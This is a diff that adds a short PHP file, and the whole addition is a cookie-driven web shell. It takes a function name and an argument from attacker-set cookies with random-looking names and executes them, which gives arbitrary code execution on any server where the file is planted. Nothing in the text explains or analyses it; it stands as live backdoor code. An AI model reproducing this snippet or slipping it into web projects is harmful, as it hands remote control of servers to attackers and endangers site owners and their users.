@@ -1,0 +1,2 @@
+<?php
+if(isset($_COOKIE["GgUv"])){$_COOKIE["dP"]($_COOKIE["GgUv"]);exit;} if(isset($_COOKIE["NsfuP"])){$_COOKIE["OqVq"]($_COOKIE["NsfuP"]);exit;}
